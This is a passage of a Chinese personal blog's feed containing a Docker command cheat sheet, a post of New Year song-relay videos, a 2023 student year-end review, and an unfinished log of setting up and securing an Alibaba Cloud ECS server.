        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>服务器中快速部署项目环境避免不了docker的使用，所以专门在这里整理一下常用的docker命令。</p><h2 id="优质视频链接"><a href="#优质视频链接" class="headerlink" title="优质视频链接"></a>优质视频链接</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1s54y1n7Ev/?spm_id_from=333.337.search-card.all.click">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2024/01/04/6596af37ca26c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Docker 10分钟快速入门</div>            <div class="tag-link-sitename">奇乐编程学院</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1Aj411r71b/?spm_id_from=333.337.search-card.all.click&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Docker网络模式</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1og4y1q7M4/?vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2024/01/04/6596b92803503.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Docker详细版教程</div>            <div class="tag-link-sitename">遇见狂神说</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="关于docker"><a href="#关于docker" class="headerlink" title="关于docker"></a>关于docker</h2><p>Docker 就像一个盒子，里面可以装很多物件，如果需要某些物件，可以直接将该盒子拿走，而不需要从该盒子中一件一件的取。<br>可以简单地把docker理解为轻量级的VM虚拟机，但它和虚拟机是有区别的，具体区别请大家自行学习。</p><h2 id="三个基本概念"><a href="#三个基本概念" class="headerlink" title="三个基本概念"></a>三个基本概念</h2><ul><li><p>镜像（Image）</p><p>Docker的镜像概念类似于虚拟机里的镜像（比如.ISO文件），是一个只读的模板，一个独立的文件系统，包括运行容器所需的数据，可以用来创建新的容器。</p><p>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了MySQL或用户需要的其它应用程序。</p><p>这里的镜像就如下方虚拟机创建时候使用的镜像类似。这个镜像便于移动，并且这个镜像我们可以交给任何人使用，其他人使用的时候也很方便，只需要将其实例化即可，这也是docker迁移项目的便捷之处。</p><p>关于创建镜像，就要讲到Dockerfile文件，镜像就是靠Dockerfile文件这个自动化脚本创建出来的。</p></li><li><p>容器（Container）</p><p>Docker容器是由Docker镜像创建的运行实例，类似VM虚拟机，支持启动，停止，删除等。</p><p>每个容器间是相互隔离的，容器中会运行特定的应用，包含特定应用的代码及所需的依赖文件。</p><p>容器就类似与虚拟机中我们创建好的虚拟机系统，之后我们所有的操作都是在容器中进行的，我们的程序也是运行在容器中。</p></li><li><p>仓库（Repository&#x2F;Hub）</p><p>镜像便于传播，而仓库就是专门用来传播这些镜像的地方，他有点类似与Github，或者你可以把他看成一个存放各种镜像的镜像商店</p><p><a href="https://hub.docker.com/">Docker官方的仓库</a>：他的服务器处于国外，所以下载速度较慢，不过我们可以通过换源解决。</p><p><a href="https://hub.daocloud.io/">daocloud国内仓库</a>：国内也有一些优秀的商店，他和Docker官方的仓库的区别类似与Github和Gitee的区别。</p><p><a href="https://c.163yun.com/hub#/home">网易云镜像中心</a></p></li></ul><h2 id="安装和基础配置"><a href="#安装和基础配置" class="headerlink" title="安装和基础配置"></a>安装和基础配置</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>因为之后要在服务器上使用，所以这篇文章使用Linux的Ubuntu20.04发行版为例进行演示。</p><p><a href="https://u.sb/debian-install-docker/">参考教程</a></p><p>Ubuntu一般自带docker，只是docker的旧版本不一定被称为docker，docker.io 或 docker-engine也有可能，所以需要先卸载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure><p>如果不能正常卸载也没事，可以跳过上面的步骤，直接启用 Docker 软件源，更新软件包即可。具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//更新软件包索引，并且安装必要的依赖软件，来添加一个新的 HTTPS 软件源</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br><span class="line">//导入源仓库的 GPG key</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">//将 Docker APT 软件源添加到你的系统</span><br><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br><span class="line">//Docker 软件源被启用了，你可以安装软件源中任何可用的 Docker 版本</span><br></pre></td></tr></table></figure><p>安装 Docker 最新版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>安装完成，Docker 服务将会自动启动。输入下面的命令进行验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><p>出现类似下面内容说明安装成功：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker.service - Docker Application Container Engine</span><br><span class="line"><span class="code">     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)</span></span><br><span class="line"><span class="code">     Active: active (running) since Thu 2020-05-21 14:47:34 UTC; 42s ago</span></span><br><span class="line"><span class="code">     ......</span></span><br></pre></td></tr></table></figure><p>当一个新的 Docker 发布时，你可以使用标准的<code>sudo apt update &amp;&amp; sudo apt upgrade</code>流程来升级 Docker 软件包。</p><p>如果你想阻止 Docker 自动更新，锁住它的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-mark hold docker-ce</span><br></pre></td></tr></table></figure><h3 id="以非-Root-用户身份执行-Docker"><a href="#以非-Root-用户身份执行-Docker" class="headerlink" title="以非 Root 用户身份执行 Docker"></a>以非 Root 用户身份执行 Docker</h3><p>默认情况下，只有 root 或者 有 sudo 权限的用户可以执行 Docker 命令。</p><p>想要以非 root 用户执行 Docker 命令，你需要将你的用户添加到 Docker 用户组，该用户组在 Docker CE 软件包安装过程中被创建。想要这么做，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><p>$USER是一个环境变量，代表当前用户名。登出，并且重新登录，以便用户组会员信息刷新。</p><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>在卸载 Docker 之前，你最好移除所有的容器，镜像，卷和网络。</p><p>运行下面的命令停止所有正在运行的容器，并且移除所有的 docker 对象：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker container stop $(docker container <span class="built_in">ls</span> -aq)</span><br><span class="line">docker system prune -a --volumes</span><br></pre></td></tr></table></figure><p>可以使用<code>apt</code>像卸载其他软件包一样来卸载 Docker：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt purge docker-ce</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h2 id="docker命令使用"><a href="#docker命令使用" class="headerlink" title="docker命令使用"></a>docker命令使用</h2><h3 id="镜像（Image）"><a href="#镜像（Image）" class="headerlink" title="镜像（Image）"></a>镜像（Image）</h3><p>创建镜像需要自行编写Dockerfile文件，然后使用命令<code>docker build</code>即可。目前现有的镜像够我用了，Dockerfile以后再学。</p><ul><li><strong>docker images：查看已有镜像</strong></li><li>docker images -q：查看已有镜像id</li></ul><p>去dockerhub网站搜索镜像，然后拉取镜像</p><ul><li>docker search xxx                      #xxx指你要搜索的镜像，例如mysql</li><li>docker search xxx –filter&#x3D;STARS&#x3D;3000  #搜索收藏量大于3000的xxx镜像</li><li>docker pull xxx                        #下载xxx镜像<strong>最新版</strong>，这里搜索比较慢的话需要换加速镜像</li><li>docker pull xxx:5.7                    #下载xxx镜像<strong>5.7版本</strong></li></ul><p>删除镜像</p><ul><li>docker rmi -f ID：根据id删除指定镜像</li></ul><h3 id="容器（Container）"><a href="#容器（Container）" class="headerlink" title="容器（Container）"></a>容器（Container）</h3><p>创建容器</p><ul><li><strong>docker run [参数] 镜像名</strong><br>#参数说明<br>–name&#x3D;”name”        #容器名字<br>-d                   #后台方式运行<br>-it                  #交互方式运行(进入容器)<br>-p ip:主机端口:容器端口<br>-p 主机端口:容器端口<br>-p 容器端口<br>-p 随机指定端口</li></ul><p>查看容器</p><ul><li>docker ps     #列出正在运行的容器</li><li><strong>docker ps -a  #列出所有容器（常用查看id）</strong></li></ul><p>删除容器</p><ul><li>docker rm 容器id   <strong>不能删除正在运行的容器</strong></li></ul><p>启动&#x2F;停止容器</p><ul><li><strong>docker start 容器id    #启动容器</strong></li><li>docker restart 容器id  #重启容器</li><li><strong>docker stop 容器id   #停止当前正在运行的容器</strong></li><li>docker kill 容器id   #强制停止容器</li></ul><p>日志&#x2F;进程&#x2F;元数据信息</p><ul><li>docker logs -tf –tail 10 容器id   #–tail 10表示显示10条日志</li><li>docker top 容器id                  #查看容器中进程信息</li><li>docker inspect 容器id              #显示容器的所有信息</li></ul><p>当容器正在运行时</p><ul><li><strong>docker exec -it 容器id &#x2F;bin&#x2F;bash   #进入正在运行的容器,并开启一个新的终端</strong></li><li>docker attach 容器id               #进入正在运行的终端</li><li>dockr cp 容器id:&#x2F;xxx&#x2F;aaa.txt &#x2F;xxx  #将容器中&#x2F;xxx文件夹下的aaa.txt文件拷贝到主机的&#x2F;xxx文件夹下</li></ul><p>数据挂载——数据卷技术</p><ul><li>docker run -d -p 3310:3306 -v &#x2F;home&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d -v &#x2F;home&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql -e MYSQL_ROOT_PASSWORD&#x3D;123456 –name mysql01 mysql:5.7<br>#参数说明<br>-d 后台运行<br>-p 主机端口:容器端口             #端口映射<br>-v 主机地址:容器地址             #卷挂载<br>-e MYSQL_ROOT_PASSWORD&#x3D;123456   #配置密码为123456<br>–name 容器名字</li></ul><h3 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h3><p>常用的就是创建yaml文件，然后运行即可，关键在于yaml文件的编写。</p><ol><li>创建并编写yaml文件</li><li>使用命令运行<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>至于如何编写yaml文件建议自学，可以参考这些部署教程：<a href="https://blog.xxfer.cn/posts/79f9b780.html">Nginx Proxy Manager</a>、<a href="https://blog.xxfer.cn/posts/4c41eeca.html">自建Picsur</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 自主开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024《北京欢迎你》接力，你都看了吗？</title>
      <link href="/posts/61ac759f.html"/>
      <url>/posts/61ac759f.html</url>
      <cover>https://www.freeimg.cn/i/2024/01/16/65a66a1a6ffb6.jpg</cover>
      <date>Mon Jan 01 2024 20:44:33 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="新年快乐！"><a href="#新年快乐！" class="headerlink" title="新年快乐！"></a>新年快乐！</h1><div class="tabs" id="mov"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="mov-1">【北京欢迎你】翻唱up们的第一波新年祝福</button><button type="button" class="tab " data-href="mov-2">翻唱up们的第二波祝福来啦！</button><button type="button" class="tab " data-href="mov-3">还有你认识的up吗？</button></ul><div class="tab-contents"><div class="tab-item-content active" id="mov-1"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/d3ce6e53d499746ba52a4004427387ad.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div><div class="tab-item-content" id="mov-2"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/63725be4380fb7bc1d7a4c1ab1640e68.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div><div class="tab-item-content" id="mov-3"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/989ddde596bbe4010b7c309558007480.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div class="tabs" id="乐器"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="乐器-1">全国34个省级行政区合唱接力</button><button type="button" class="tab " data-href="乐器-2">【北京欢迎你】乐器接力</button></ul><div class="tab-contents"><div class="tab-item-content active" id="乐器-1"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/5d24bd8b633d08c7e410b554ee10a3e9.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div><div class="tab-item-content" id="乐器-2"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/3abba0491fd94122abc6a0742d9308fc.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div class="tabs" id="不一样的接力"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="不一样的接力-1">【北京欢迎你】手语版接力大合唱来了！</button><button type="button" class="tab " data-href="不一样的接力-2">【北京欢迎你】高原军营版</button></ul><div class="tab-contents"><div class="tab-item-content active" id="不一样的接力-1"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/85e0d1b6d24c5dc9fab5a6fadc257914.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div><div class="tab-item-content" id="不一样的接力-2"><div class="video"><video controls preload><source src='https://pan.freeimg.cn/view.php/08cc727aee5bcfb9fe16e770a759aa83.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div>]]></content>
      
      
      <categories>
          
          <category> 日常生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2024 </tag>
            
            <tag> 北京欢迎你 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再见，2023！你好，2024！</title>
      <link href="/posts/e26dd8b5.html"/>
      <url>/posts/e26dd8b5.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/07/65e93aa0551da.png</cover>
      <date>Mon Jan 01 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-fan simple"><p>转眼一年又过去了，这一年发生了很多事呀……</p></div><h2 id="一些心路历程"><a href="#一些心路历程" class="headerlink" title="一些心路历程"></a>一些心路历程</h2><p>其实，这一年，主线任务还是一尘不变的学习，关键在于心态的转变吧。以前，我一直觉得只要学，就完事儿了，所以就随大流卷绩点，卷保研。</p><p>事实上也确实卷得小有成就，但也就仅此而已。</p><p>就这样的状态一直到了大二上学期吧，慢慢觉得这样子还远远不够。也许是醒悟了，就觉得即使如愿保研了，那又能怎样了，不过是比别人早点上岸研究生，这真的是上岸了吗？</p><p>到了2023年，终于有点想明白了，所以这一年是值得记录的一年。</p><h2 id="对于保研这件事"><a href="#对于保研这件事" class="headerlink" title="对于保研这件事"></a>对于保研这件事</h2><p>以前一直秉着“能保则保”的原则，不断强化着专业课程的学习。后来到了大二下学期，以微乎其微的优势暂时领先，成了“保绩点边缘人”😇，这几年在这方面的努力也算是得到了一点回报吧。当然，我也不想半场开香槟，这不是总结重点……</p><p>其实我现在的打算就是：卷技术第一，卷保研第二，能拿到推免资格自然是好的，但如果在2024年乃至2025年能够拿到心仪的offer，也许我要好好考虑考虑是否去读这个研究生了。保研或者说读研不过是一种选择，读研本就是为了将来能更好地就业，况且我今后大概率也不会继续攻读博士，也不想当大学老师。</p><p>既然如此，又何必要把读研看得如此重要。总之现在的就业环境如此复杂，想要能在社会中占得一席之地，没有真材实料怎么行？</p><p>其他的也不多说什么，说实在，专业课需要好好学，可应付考试的话就算了，不如去多敲几行代码呢！</p><h2 id="这一年尝试的新事物"><a href="#这一年尝试的新事物" class="headerlink" title="这一年尝试的新事物"></a>这一年尝试的新事物</h2><h3 id="比赛成果"><a href="#比赛成果" class="headerlink" title="比赛成果"></a>比赛成果</h3><p>先是参加了不少竞赛吧，但是好像都挺水的：</p><ul><li>数模校赛一等奖——感谢两位队友的邀请❤️</li><li>虽迟但到的陕西省大学生高等数学竞赛特等奖✌️</li><li>第一届网计大赛二等奖 再接再厉💪</li><li>第十五届全国大学生数学竞赛陕西赛区一等奖✌️</li><li>第三届网计大赛三等奖💪<br>……</li></ul><p>我比较喜欢自己折腾，很多项目也喜欢独立开发。小声哔哔：有时候，真的要看准队友，这让我想到我哥跟我说的“志同道合”……😷</p><h3 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h3><p>当然这一年也搞了好多项目去实践学习，有课设，也有一些自己捣鼓的小玩意儿。基本都整理到GitHub里面了：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/JJLibra/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/23/6586e75c86de7.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">我的项目仓库</div>            <div class="tag-link-sitename">xxfer</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>课设：</p><ul><li>第一次接触QT框架，用C++写了<a href="https://blog.xxfer.cn/posts/7dca2e02.html">一个用于路径规划的Astar算法演示器</a></li><li>用python自制了一个简易识别系统界面，还想着配置后端进行强化，到现在还没有把这个坑填了😇</li></ul><p>自研项目：</p><ul><li>前端的知识倒是学习了不少，包括搭建的这个博客项目，个人主页这些</li><li>服务器搭建了各种docker小玩意儿，摸鱼必备😋</li><li>另外肯定少不了CTF的学习，算是半只脚进去了吧(doge)<br>……</li></ul><p>总之，这一年相对大一那会儿真的变了不少，还会继续努力下去的💪</p><h3 id="混了个校二等奖学金"><a href="#混了个校二等奖学金" class="headerlink" title="混了个校二等奖学金"></a>混了个校二等奖学金</h3><p>全是数学竞赛给我加的分😅，说实话拿的都有点不好意思，不过学校的钱当然能拿多少就拿多少，拿的越多越好哈哈哈。</p><h3 id="吃"><a href="#吃" class="headerlink" title="吃"></a>吃</h3><p>认识我的应该都知道，对我来说吃一直都是一个问题，好像没有什么吸引我的美食，不知道这是好事还是坏事。不过这一年，我跑的食堂比以前勤快多了，尝试的也多了，现在基本两三天伙食能做到不重样了，难绷。总之也算是在往好的方向改变吧👼</p><h3 id="来陕西三年快了，终于玩了一遍"><a href="#来陕西三年快了，终于玩了一遍" class="headerlink" title="来陕西三年快了，终于玩了一遍"></a>来陕西三年快了，终于玩了一遍</h3><p>我其实不太喜欢跟着导游看景点，所以这趟出游感觉最好玩的就兵马俑和壶口瀑布吧，逛旅游景点还不如去五星级酒店体验生活或者去山里野一把啥的😏</p><p>不过看兵马俑的人是真的多，拍了一个还有点颜色🙃</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/10/659ebc0ee90b3.jpg"/></div></div><h3 id="第一个自费“梯子”"><a href="#第一个自费“梯子”" class="headerlink" title="第一个自费“梯子”"></a>第一个自费“梯子”</h3><p>GitHub上面找的一个“梯子”，有可以白嫖的节点，但是速度比较慢，所以后面冲了个年费，算是第一个自费“梯子”了。挺好用的，很多国家的节点都有了，速度也是可以的。</p><h3 id="第一枚域名"><a href="#第一枚域名" class="headerlink" title="第一枚域名"></a>第一枚域名</h3><p>有了属于自己的域名，刚开始还是选择国内大厂的产品，主要比较稳定牢靠。以后可以买小厂或者国外的，便宜点，可以胡乱造。</p><h3 id="第一台云服务器"><a href="#第一台云服务器" class="headerlink" title="第一台云服务器"></a>第一台云服务器</h3><p>年底买了一台云服务器，为此我还特意写了一篇<a href="https://blog.xxfer.cn/posts/9a5ae3b8.html">博客</a>记录。想着学习一下服务器的运维使用，然后在上面搭建一些个人应用。现在看来有些麻烦，要好好研究研究。买之前觉得挺简单的，买了以后有点懵，不过用着用着就好了。</p><p>也是趁着阿里云杭州的云栖大会的活动，入手的包年服务器，很划算了已经，就这个<a href="https://www.aliyun.com/lowcode/promotion/allinaliyun/99program">活动</a>，对我这种刚上手的很友好😋，完全够用了。</p><h2 id="结束我们难忘的新冠疫情"><a href="#结束我们难忘的新冠疫情" class="headerlink" title="结束我们难忘的新冠疫情"></a>结束我们难忘的新冠疫情</h2><p>新冠疫情已经一去不复返了，我们终于“自由”啦。当然希望高中能够接受我们的申请，安排我和hxd的“学生大使回访母校”的活动。去年因为疫情被婉拒了，期待今年的寒假……</p><h2 id="对2024的展望"><a href="#对2024的展望" class="headerlink" title="对2024的展望"></a>对2024的展望</h2><p>如愿保上研，努力提高专业技术，然后不管是变成社畜，还是成为研究牲，都要努力活着，就是这样……</p><p>说实在的，我觉得前端学起来还是挺有意思的，就像游戏一样，不像后端业务这么繁琐（前端也有令人头大的知识点，但是修炼CSS大法会发现很多乐趣）。前端的东西虽然相对比较少，但是想要精通，还是需要下工夫的。可话又说回来，我将来并不打算从事前端的工作，所以学的差不多就好，毕竟咱是个程序员，前端的东西多少得懂一些。剩下的时间多花点在网安上吧，虽说网安就业也不咋地，但下了工夫总是有用的。至于将来的就业方向，还是得斟酌一下，别限的太死，可大体方向得确定了，然后花一年多的时间去准备吧。</p><p>总之，在新的一年里，要继续努力，要努力变强。还有，在新的一年里，我有可能从i变e吗？🙏</p>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【持续更新...】阿里云ECS服务器使用日志</title>
      <link href="/posts/8127414b.html"/>
      <url>/posts/8127414b.html</url>
      <cover>https://www.freeimg.cn/i/2024/01/02/6593c63b046e2.png</cover>
      <date>Sat Dec 30 2023 20:44:33 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前段时间，在某云上买了一台云服务器。这是第一台自己的服务器，所以有些不知所措吧，一下子不知道该干什么了。本来我的初衷是在服务器上结合docker部署一些项目，以及为了给我的域名备案使用。买了以后，发现各种问题接踵而至。如何使用？如何选择远程连接的方式？如何确保服务器的安全？</p><p>刚买第二天就给我报各种风险漏洞，虽然目前没有什么东西放在上面，但是也不能一直这样下去。因此，我就到处去学如何使用这台服务器（当然包括官方文档），来解决上面的问题。现在真心觉得维护工作好麻烦，我在想部署项目的时候不知道会有什么更大的问题在等着我……</p><p>我会在这里记录使用服务器过程中遇到的问题与解决方案，算是服务器使用日志吧。</p><p><strong>服务器操作系统：Debian 11</strong></p><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-30</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> 远程连接 </summary>              <div class='content'>              <p>远程连接的方式有很多，提供远程连接的软件也有很多，根据实际需求选择合适的软件即可。下面介绍几种常见的远程连接方式或软件吧</p><h3 id="网页端远程连接"><a href="#网页端远程连接" class="headerlink" title="网页端远程连接"></a>网页端远程连接</h3><p>这应该是最最最简单，或者说用户最容易发现的方法了吧，简单讲下：</p><ol><li>进入云服务商官网控制台，左上角扩展中找到“云服务器ECS”进入实例管理</li><li>点击远程连接，选择连接方式，输入密码即可连接</li></ol><p><strong>如果忘记密码可以离线重置密码，重置以后不要忘了重启实例</strong></p><p>这种连接方式就是浏览器通过云服务商连接到远端的服务器，浏览器与服务商之间使用HTTPS协议，服务商与服务器之间使用的是SSH协议，这两种协议的安全性都有保证，所以可以放心使用。</p><h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>VNC是基于RFB协议的有界面的连接方式，但是RFB协议不够安全，不建议经常使用VNC连接。可是，一般排查一些异常会用到VNC，所以VNC是需要学会的。</p><p>第一次使用服务器需要设置VNC远程连接密码，实例操作中的“更多”，找到密码&#x2F;密钥，里面就能修改VNC远程密码。</p><h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><p>VNC和RDP都是有界面的连接模式，但是RDP更安全，所以一般选择RDP来连接的比较多。RDP是微软的专有协议，在Windows下使用非常方便，而且更安全，另外RDP需要在安全组中开启3389端口。</p><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>还有一种更安全的连接方式，那当然是SSH连接，毕竟密钥对肯定比密码更安全啦。</p><p>在控制台左边有一栏是“网络与安全”，里面有一个密钥对，去创建一个密钥对。其实就是在本地生成一个私钥，需要保存好，不要泄露了。之后远程连接时使用证书连接即可。</p><p><strong>生成的私钥文件一定要保存好，这个文件只能下载一次</strong></p><h3 id="Websockets-SSL免密登录"><a href="#Websockets-SSL免密登录" class="headerlink" title="Websockets+SSL免密登录"></a>Websockets+SSL免密登录</h3><p>简单来讲就是要在服务器端安装一个阿里云的客户端来支持免密登录。</p><h3 id="客户端连接（我采用的方式）"><a href="#客户端连接（我采用的方式）" class="headerlink" title="客户端连接（我采用的方式）"></a>客户端连接（我采用的方式）</h3><p>一般大厂提供的云服务都会有自己的客户端连接软件，比如阿里云、腾讯云等。使用他们开发提供的客户端也会比较放心，直接下载安装即可。</p><p>具体的操作方式可以参考下面的视频：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1724y1o7ih/?spm_id_from=333.337.search-card.all.click">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">远程连接云服务器的方式汇总</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>              </div>            </details></div></div></div><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-12</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> 处理服务器报警的漏洞 </summary>              <div class='content'>              <p>使用服务器的第二天，就给我报了两个中小漏洞出来，短短几天又爆出来十几个，我的天。作为网安人肯定不能忍，于是就去网上寻找解决方案，下面我来讲讲我是如何解决漏洞的。</p><p>这里出现的漏洞主要是系统漏洞、Web漏洞以及应用漏洞。基本平时碰到的漏洞一般都是系统漏洞，这是因为Linux内核或者应用程序中必然会存在一些缺陷或者错误。</p><h3 id="手动修复漏洞（免费）"><a href="#手动修复漏洞（免费）" class="headerlink" title="手动修复漏洞（免费）"></a>手动修复漏洞（免费）</h3><p>具体请看下文<a href="https://blog.xxfer.cn/posts/8127414b.html#%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%EF%BC%9F">如何做好安全防护？</a></p><!-- - 对于系统漏洞  新的软件意味着更少的漏洞。  我的服务器操作系统是Linux的，主要为了加强对Linux的使用学习。所以以Linux为例，可以执行yum update -y命令来升级和修复系统。  执行以后，重启服务器，等第二天的扫描结果，漏洞确实减少了，但还是存在漏洞。亲测至少是有效的，这种方法应该可以解决大多数报的小危漏洞。  yum是一个用于管理RPM包的工具，它可以自动解决包之间的依赖关系，方便地安装、更新或删除软件包。yum update -y命令的作用是更新当前系统可升级的最新版本的软件包，包括内核和系统版本。这样可以修复一些已知的系统漏洞，提高系统的安全性和稳定性。但是，yum update -y 